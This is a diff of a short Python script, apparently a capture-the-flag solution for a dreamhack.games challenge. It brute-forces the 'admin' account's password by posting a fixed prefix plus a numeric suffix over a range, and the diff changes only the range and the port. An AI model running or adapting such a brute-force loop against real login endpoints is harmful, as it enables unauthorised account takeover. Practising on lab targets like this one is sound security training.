@@ -18,13 +18,13 @@
 
 import requests
 
-for i in range(1307000, 1309357):
+for i in range(85226000, 85228000):
 	data = {
 		"id" : "admin",
 		"password" : "shs2848divv8ru4uwau3u48sdifjsigjirjgls8bvcawe2" + str(i),
 	}
 
-	r = requests.post('http://host3.dreamhack.games:10582/user/account', data=data)
+	r = requests.post('http://host3.dreamhack.games:23744/user/account', data=data)
 
 	if "success" in r.text:
 		print(data)
